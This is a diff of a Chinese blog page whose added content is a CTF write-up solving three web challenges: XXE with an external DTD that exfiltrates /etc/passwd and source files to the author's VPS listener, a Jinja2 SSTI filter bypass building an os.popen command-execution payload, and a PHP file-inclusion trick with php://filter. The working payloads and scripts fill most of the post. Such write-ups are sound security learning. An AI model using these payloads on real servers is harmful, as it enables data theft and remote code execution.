@@ -1,114 +1,453 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
+  <title>ctf-wp-saining | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="环境地址61.147.171.107:10081 61.147.171.107:10082 61.147.171.107:10083    10081 xml注入访问源代码分析，感觉应该的是个xml外部实体注入  先构造payload试一哈： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [     &lt;!ENTITY">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf-wp-saining">
+<meta property="og:url" content="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:description" content="环境地址61.147.171.107:10081 61.147.171.107:10082 61.147.171.107:10083    10081 xml注入访问源代码分析，感觉应该的是个xml外部实体注入  先构造payload试一哈： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [     &lt;!ENTITY">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png">
+<meta property="article:published_time" content="2022-02-15T08:34:16.000Z">
+<meta property="article:modified_time" content="2022-02-15T14:34:41.898Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="面试题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png">
   
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
-  
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-ctf-wp-saining" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctf-wp-saining
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><pre class="language-none"><code class="language-none">61.147.171.107:10081
+61.147.171.107:10082
+61.147.171.107:10083</code></pre>
+
+
+
+<h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p>
+<p>先构造payload试一哈：</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>
+
+<p>确实存在，但是有过滤</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p>
+<p>尝试使用参数型实体方式注入：</p>
+<p><code>vps</code>构造<code> test.dtd</code></p>
+<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>
+
+<p>开启端口监听：<code>nc -lvvp 8888</code></p>
+<p>攻击payload:</p>
+<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE convert [
+	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;139.196.234.164:8899&#x2F;test.dtd&quot;&gt;
+	%remote;%int;%send;
+]&gt;</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p>
+<p>成功返回加密字符串，解密后获取</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p>
+<p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p>
+<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>
+
+<p>发包获取到源码如下：</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+error_reporting(0);
+function showAttrs($attrs) &#123;
+    $r &#x3D; [&quot;&quot;];
+    foreach ($attrs as $k &#x3D;&gt; $v) &#123;
+        array_push($r, $k . &quot;&#x3D;\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);
+    &#125;
+    return implode(&quot; &quot;, $r);
+&#125;
+
+function showNode($n, $pre) &#123;
+    if ($n-&gt;hasChildNodes()) &#123;
+        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;
+        foreach ($n-&gt;childNodes as $c) &#123;
+            show($c, $pre . &quot; &quot;);
+        &#125;
+        echo $pre . &quot;&lt;&#x2F;&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;
+    &#125; else &#123;
+        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&#x2F;&gt;\n&quot;;
+    &#125;
+&#125;
+
+function show($n, $pre) &#123;
+    switch ($n-&gt;nodeType) &#123;
+        case XML_ELEMENT_NODE:
+            showNode($n, $pre);
+            break;
+
+        case XML_TEXT_NODE:
+        case XML_CDATA_SECTION_NODE:
+        case XML_ENTITY_REF_NODE:
+            echo $pre . $n-&gt;textContent . &quot;\n&quot;;
+            break;
+        
+        case XML_COMMENT_NODE:
+            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;
+            break;
+
+        case XML_DOCUMENT_NODE:
+            foreach ($n-&gt;childNodes as $c) &#123;
+                show($c, $pre);
+            &#125;
+            break;
+
+        default:
+        	echo &quot;Nope&quot;;
+            break;
+    &#125;
+&#125;
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123;
+    $d &#x3D; new DOMDocument();
+    $data &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);
+    if(preg_match(&#39;&#x2F;file|rot13&#x2F;i&#39;, $data))
+    &#123;
+        die(&#39;illegal!&#39;);
+    &#125;
+    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);
+
+    if ($d-&gt;validate()) &#123;
+        show($d, &quot;&quot;);
+    &#125; else &#123;
+        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;
+    &#125;
+
+&#125; else &#123;
+    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);
+&#125; </code></pre>
+
+<p>看了一下源码没啥东西</p>
+<p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p>
+<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p>
+<p>确实有值，解密后成功拿到flag</p>
+<pre class="language-none"><code class="language-none">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p>
+<h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p>
+<p>呦西 ，确实有ssti！</p>
+<p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p>
+<pre class="language-python" data-language="python"><code class="language-python">blackwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'redirect'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'get_flashed_messages'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">]</span></code></pre>
+
+<p>那就绕吧，怎么绕呢？</p>
+<p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p>
+<pre class="language-none"><code class="language-none">&#123;% set org &#x3D; (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p>
+<p>编写获取对应字符串搜索脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
+<span class="token comment"># -*- coding:utf-8 -*-</span>
+<span class="token comment"># author:greetdawn</span>
+
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://61.147.171.107:10082/?name="</span>
+payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;"</span> 
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token comment"># print(r.text)</span>
+	<span class="token keyword">if</span> <span class="token string">'/'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] paylaod: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">break</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"search &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>依次获取更多字符</p>
+<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _
+&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格
+&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (
+&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )
+&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#39;
+&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .
+
+&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins
+&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import
+&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen
+&#123;% set os &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os
+&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat
+&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag
+&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval
+&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125; &#123;&#123;red&#125;&#125; # read
+&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125;    # __builtins__
+
+&#123;% set zero &#x3D; (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字
+&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1
+&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2
+&#123;% set four &#x3D; (two*two)|int %&#125;    # 4
+&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5
+&#123;% set three &#x3D; five-one-one %&#125;    # 3
+&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9
+&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7
+&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # 字符 c
+&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # 百分号 %
+&#123;% set bfhc &#x3D; bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
+&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 &#x2F;</code></pre>
+
+<p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p>
+<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">http:&#x2F;&#x2F;61.147.171.107:10082&#x2F;?name&#x3D;&#123;% set zero &#x3D; (self|int) %&#125;
+&#123;% set one &#x3D; (zero**zero)|int %&#125;
+&#123;% set two &#x3D; (zero-one-one)|abs %&#125;
+&#123;% set four &#x3D; (two*two)|int %&#125;
+&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;
+&#123;% set three &#x3D; five-one-one %&#125;
+&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;
+&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;
+&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;
+&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;
+&#123;% set bfhc &#x3D; bfh~c %&#125;
+&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;
+&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;
+&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125;
+&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;
+&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125;
+&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125;
+&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125;
+&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;
+&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;
+&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;
+&#123;% set exo &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;
+&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;
+&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;
+&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;
+&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;
+&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125; 
+&#123;% set pld &#x3D; xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;
+&#123;&#123;pld&#125;&#125;</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p>
+<p>带入万能payload构造eval执行命令</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> whoami<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
+        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> v<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> 
+            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p>
+<h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p>
+<p><code>payload：</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">file1<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>
+file2<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>hello ctf</code></pre>
+
+<p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" alt="image-20220215164654261">成功获取base64值解密得flag</p>
+<pre class="language-php" data-language="php"><code class="language-php"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9
+ 
+ <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"WRONG WAY!"</span><span class="token punctuation">;</span>
+<span class="token comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span></code></pre>
+
+<h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2>
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2022/02/15/ctf-wp-saining/" class="article-date">
+  <time class="dt-published" datetime="2022-02-15T08:34:16.000Z" itemprop="datePublished">2022-02-15</time>
+</a>
+
+        </li>
+        
+          <li>
+            <span class="label">Category:</span>
+            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a>
   </div>
-</footer>
-</div>
-</div>
-
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
